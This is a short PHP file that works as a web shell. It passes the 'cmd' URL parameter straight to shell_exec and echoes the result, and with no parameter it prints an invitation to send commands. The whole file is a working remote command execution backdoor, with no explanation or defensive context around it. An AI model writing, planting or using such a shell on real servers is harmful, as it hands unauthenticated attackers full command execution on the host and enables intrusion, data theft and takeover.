<?php

if(isset($_GET['cmd']) && strcmp($_GET['cmd'], "" ) != 0){
    echo(shell_exec($_GET['cmd']));
}else{
    echo ("feed some commands to url parameter 'cmd'");
}

?>
